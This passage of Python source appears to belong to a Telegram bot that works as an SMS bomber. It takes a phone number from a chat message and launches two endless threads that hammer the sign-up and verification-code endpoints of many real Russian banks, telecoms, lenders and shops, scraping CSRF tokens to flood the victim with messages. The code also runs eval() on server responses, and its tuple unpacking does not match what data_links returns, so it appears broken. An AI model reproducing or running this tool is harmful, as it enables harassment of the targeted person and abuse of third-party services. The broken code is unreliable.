    data1223 = {'phone' : str(num7)} # задержка 5 минут (вроде)
    return link1, link2,  link4, link5, link6, link7, link8,  link10,  link12, link13, link14, link15, link16, link17, link18, link19, link20, link21, link22, link23, link24,  data1, data2,  data4, data5, data6, data7, data8,  data10,  data13, data14, data15, data16, data17, json_data111, data18, data19, number_call, data20, data1223, data21, data22, data23, data24, params2

def sms_one(): 
    link1, link2,  link4, link5, link6, link7, link8,  link10,  link12, link13, link14, link15, link16, link17, link18, link19, link20, link21, link22, link23, link24, data1, data2,  data4, data5, data6, data7, data8,  data10 ,  data13, data14, data15, data16, data17, json_data111, data18, data19, number_call, data20, data1223, data21, data22, data23, data24, params2 = data_links(number)
    
    global lst
    while Flag:
        
        try:
            requests.post('https://okunay.ru/ajax', params=params2, headers=headers_okunay, data=data2)
        except:
            pass 
        sleep(0.01)
        
        try:
            requests.post(link6, data=data6, headers=headers)
        except:
            pass 
        sleep(0.01)
            
        try:
            requests.post(link7, data=data7, headers=headers, verify=False)
        except:
            pass
        sleep(0.01)
        
        try:
            requests.post(link8, data=data8, headers=headers)
        except:
            pass
    
        sleep(0.01)

        try:
            requests.post(link19, headers=headers_zaymigo, json=data19)
        except: 
            pass
        
        sleep(0.01)

        try:
            requests.post(link1, data=data1, headers=headers)
        except: 
            pass
                
        sleep(0.01)

        try:
            requests.post(link24,  headers=headers_rshb, json=data24)
        except: 
            pass
        sleep(0.01)


def sms_two():
    link1, link2,  link4, link5, link6, link7, link8,  link10,  link12, link13, link14, link15, link16, link17, link18, link19, link20, link21, link22, link23, link24, data1, data2,  data4, data5, data6, data7, data8,  data10 ,  data13, data14, data15, data16, data17, json_data111, data18, data19, number_call, data20, data1223, data21, data22, data23, data24 = data_links(number)
    time_sms_two = monotonic()
    global lst
    while Flag:  
        if int(monotonic()-time_sms_two) >= 3:
            try:
                ses = requests.Session()
                r12 = ses.get("https://berkat.ru/auth/register", headers=headers_berkat)
                soup = BeautifulSoup(r12.content, 'html.parser')
                csrf = soup.find('input', {'name': 'csrf_token'})['value']

                data122 = {
                    'phone': str(number),
                    'csrf_token': csrf,
                }

                ses.post('https://berkat.ru/auth/phonegetcode', headers=headers_berkat, data=data122)
            except:
                pass
            
            sleep(0.01)
            
            try:
                link1223 = 'https://info-api.er.ru/api/auth/authenticate'
                requests.post(link1223, data=data1223, headers=headers)
            except: 
                pass
            
            sleep(0.01)

            try:
                requests.post(link2, data=data2, headers=headers)
            except:
                pass
            sleep(0.01)
            
            
            try:
                requests.post(link4, data=data4, headers=headers)
            except:
                pass
            sleep(0.01)
            try:
                requests.post(link5, data=data5, headers=headers)
            except:
                pass
            sleep(0.01)
            
            try:
                requests.post(link12, headers=headers) # задержка 1 минута
            except:
                pass
            sleep(0.01)
            try:
                requests.get(link13, data=data13, headers=headers_pharmperm)
            except:
                pass
            sleep(0.01)
            try:
                requests.post(link14, headers=headers_sokolov, data=data14)
            except:
                pass
            sleep(0.01)
        
            try:
                requests.post(link15, headers=headers, json=data15)
            except:
                pass
            sleep(0.01)
            try:
                requests.post(link16, headers=headers_lunaro, json=data16)
            except:
                pass
            sleep(0.01)
            try:
                requests.post(link17,  headers=headers_riviera , data=data17)
            except:
                pass
            sleep(0.01)
            try:
                link111 = 'https://chaika.com/api/v1/auth/registration/person'
                link222 = 'https://chaika.com/api/v1/auth/registration/send-code'


                response1 = requests.post(link111, headers=headers, json=json_data111)
                text = response1.text
                text = text.replace("null", "None")
                text = text.replace("false", "False")
                text = eval(text)
                text = text['token']

                json_data222 = {
                    'token': text,
                }

                requests.post(link222,  headers=headers_chaika, json=json_data222)
                
            except:
                pass

            sleep(0.01)

            try:
                requests.post(link18, headers=headers_evrasia, data=data18)
            except:
                pass
            
            sleep(0.01)
            
            try:
                requests.post(link20, headers=headers_nadodeneg, json=data20)
            except:
                pass
            time_sms_two = monotonic()
            sleep(0.01)

            try:
                requests.post(link22, data=data22, headers=headers_beeline)
            except:
                pass
            
            sleep(0.01)
            
            try:
                requests.post(link23, data=data23, headers=headers_mtsbank)
            except:
                pass

            sleep(0.01)



def start_spam(message):
    global number
    number = message.text
    link1, link2,  link4, link5, link6, link7, link8,  link10,  link12, link13, link14, link15, link16, link17, link18, link19, link20, link21, link22, link23, link24, data1, data2,  data4, data5, data6, data7, data8,  data10 ,  data13, data14, data15, data16, data17, json_data111, data18, data19, number_call, data20, data1223, data21, data22, data23, data24 = data_links(number)
    bot.send_message(message.chat.id, '*Спам Начинается !*', parse_mode="Markdown")
    global Flag
    Flag = True
    requests.post(link21,  headers=headers, data=data21, verify=False)
    try:
        requests.post(link10, data=data10, headers=headers)
    except:
        pass
    threading.Thread(target=sms_one).start()
    threading.Thread(target=sms_two).start()



if __name__ == '__main__':
    bot.infinity_polling()


